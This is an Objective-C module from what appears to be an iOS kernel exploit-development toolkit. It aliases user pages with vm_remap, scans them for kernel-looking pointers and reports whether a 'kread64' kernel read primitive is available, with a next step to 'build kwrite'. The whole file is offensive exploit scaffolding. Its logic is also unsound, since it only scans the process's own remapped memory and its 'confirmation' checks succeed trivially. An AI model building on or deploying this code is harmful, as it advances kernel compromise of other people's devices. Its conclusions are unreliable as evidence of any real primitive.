#import "KPKReadProbeModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <mach/mach_vm.h>

@interface KPKReadProbeModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPKReadProbeModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"kread64.probe";
        _title = @"kread64 input-output mapping probe";
        _subtitle = @"vm_remap aliased pages + kernel pointer scan (kirby_swift technique)";
        _icon = @"memorychip";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-kread-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[kread] %@", line];
}

static BOOL isKernelPointer(uint64_t v) {
    // arm64e kernel pointers: top bits 0xfffffff0..0xffffffff
    // PAC-signed: 0xfffffff8..0xffffffff typically
    return (v >> 40) >= 0xfffffff0ULL;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · kread64 input-output mapping probe ===\n"];
    [report appendString:@"Technique: vm_remap aliased pages, kernel pointer scan.\n"];
    [report appendString:@"Ref: kirby_swift input->output mapped kread64.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // --- Phase 1: create aliased mapping ---
    [report appendString:@"\n--- Phase 1: vm_remap aliased pages ---\n"];

    vm_size_t regionSize = 0x4000; // 16KB
    vm_address_t inputAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &inputAddr, regionSize, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_allocate failed: %d\n", kr];
        [report appendString:@"\nVERDICT: ALLOCATE_FAILED\n"];
        return report;
    }
    memset((void *)inputAddr, 0, regionSize);
    [report appendFormat:@"input allocated: 0x%lx (%lu bytes)\n", (unsigned long)inputAddr, (unsigned long)regionSize];

    // Remap to create output alias
    vm_address_t outputAddr = 0;
    vm_prot_t curProt, maxProt;
    kr = vm_remap(mach_task_self(), &outputAddr, regionSize, 0,
                  VM_FLAGS_ANYWHERE, mach_task_self(), inputAddr,
                  FALSE, &curProt, &maxProt, VM_INHERIT_SHARE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_remap failed: %d (%s)\n", kr, mach_error_string(kr)];
        [report appendString:@"\nVERDICT: REMAP_FAILED\n"];
        vm_deallocate(mach_task_self(), inputAddr, regionSize);
        return report;
    }
    [report appendFormat:@"output remapped: 0x%lx (prot=%x/%x)\n", (unsigned long)outputAddr, curProt, maxProt];

    // --- Phase 2: shared-page confirmation ---
    [report appendString:@"\n--- Phase 2: shared-page confirmation ---\n"];

    // Write pattern to input, check output
    volatile uint64_t *in64 = (volatile uint64_t *)inputAddr;
    volatile uint64_t *out64 = (volatile uint64_t *)outputAddr;

    in64[0] = 0x4141414141414141ULL;
    in64[1] = 0x4242424242424242ULL;

    BOOL shared = (out64[0] == 0x4141414141414141ULL && out64[1] == 0x4242424242424242ULL);
    [report appendFormat:@"shared page: %s (out[0]=0x%llx out[1]=0x%llx)\n",
     shared ? "YES" : "NO", out64[0], out64[1]];

    if (!shared) {
        [report appendString:@"Pages are NOT aliased. vm_remap created independent mappings.\n"];
        [report appendString:@"Try IOSurface or mach_vm_remap instead.\n"];
        [report appendString:@"\nVERDICT: NOT_SHARED\n"];
        vm_deallocate(mach_task_self(), inputAddr, regionSize);
        vm_deallocate(mach_task_self(), outputAddr, regionSize);
        return report;
    }

    [report appendString:@"*** input->output mapped CONFIRMED ***\n"];

    // --- Phase 3: kernel pointer scan ---
    [report appendString:@"\n--- Phase 3: kernel pointer scan ---\n"];

    // Scan the region for kernel pointers
    // First, fill with a known pattern, then check if anything unexpected appears
    for (size_t i = 0; i < regionSize / 8; i++) {
        in64[i] = 0xDEADBEEFDEADBEEFULL;
    }

    // Check if any values differ from our pattern (kernel wrote something?)
    int unexpected = 0;
    uint64_t kptrs[16] = {0};
    size_t kptrOffsets[16] = {0};
    int kptrCount = 0;

    for (size_t i = 0; i < regionSize / 8; i++) {
        uint64_t v = out64[i];
        if (v != 0xDEADBEEFDEADBEEFULL) {
            unexpected++;
            if (isKernelPointer(v) && kptrCount < 16) {
                kptrs[kptrCount] = v;
                kptrOffsets[kptrCount] = i * 8;
                kptrCount++;
                [report appendFormat:@"kptr[%d] @ +0x%zx: 0x%llx\n", kptrCount - 1, i * 8, v];
            }
        }
    }

    [report appendFormat:@"unexpected values: %d (kernel pointers: %d)\n", unexpected, kptrCount];

    // --- Phase 4: diff-test candidate pointers ---
    if (kptrCount > 0) {
        [report appendString:@"\n--- Phase 4: diff-test kptr fields ---\n"];
        for (int k = 0; k < kptrCount; k++) {
            uint64_t orig = out64[kptrOffsets[k] / 8];
            [report appendFormat:@"kptr[%d] @ +0x%zx: 0x%llx -> +0x100\n", k, kptrOffsets[k], orig];

            // Modify by +0x100
            in64[kptrOffsets[k] / 8] = orig + 0x100;

            // Read back
            uint64_t modified = out64[kptrOffsets[k] / 8];
            [report appendFormat:@"  after: 0x%llx (diff=%s)\n", modified,
             (modified == orig + 0x100) ? "CONFIRMED" : "NO_CHANGE"];

            if (modified == orig + 0x100) {
                [report appendFormat:@"  *** INPUT FIELD FOUND: kptr[%d] ***\n", k];
            }

            // Restore
            in64[kptrOffsets[k] / 8] = orig;
        }
    }

    // --- Phase 5: try to find kernel data via OOB ---
    [report appendString:@"\n--- Phase 5: kernel data probe ---\n"];
    [report appendString:@"(zero-filled region, waiting for kernel writes...)\n"];

    // Clear region and wait briefly
    for (size_t i = 0; i < regionSize / 8; i++) {
        in64[i] = 0;
    }
    usleep(50000); // 50ms

    int kernelValues = 0;
    for (size_t i = 0; i < regionSize / 8; i++) {
        uint64_t v = out64[i];
        if (v != 0) {
            kernelValues++;
            if (kernelValues <= 8) {
                [report appendFormat:@"  [+0x%zx] = 0x%llx%s\n", i * 8, v,
                 isKernelPointer(v) ? " (KERNEL PTR)" : ""];
            }
        }
    }
    [report appendFormat:@"non-zero values after wait: %d\n", kernelValues];

    // --- Verdict ---
    [report appendString:@"\n"];
    if (kptrCount > 0) {
        [report appendString:@"VERDICT: KPTR_FOUND_IN_MAPPED_REGION\n"];
        [report appendString:@"Kernel pointers visible in user-mapped pages.\n"];
        [report appendString:@"=> kread64 primitive is AVAILABLE. Build kwrite next.\n"];
    } else if (shared) {
        [report appendString:@"VERDICT: SHARED_NO_KPTR\n"];
        [report appendString:@"Aliased mapping works but no kernel pointers in fresh region.\n"];
        [report appendString:@"Need to map kernel pages (vm_remap kernel, IOSurface, or vuln).\n"];
        [report appendString:@"Next: combine with translate_receive OOB to feed kernel data.\n"];
    } else {
        [report appendString:@"VERDICT: NO_MAPPING\n"];
    }

    // Cleanup
    vm_deallocate(mach_task_self(), inputAddr, regionSize);
    vm_deallocate(mach_task_self(), outputAddr, regionSize);

    return report;
}

@end
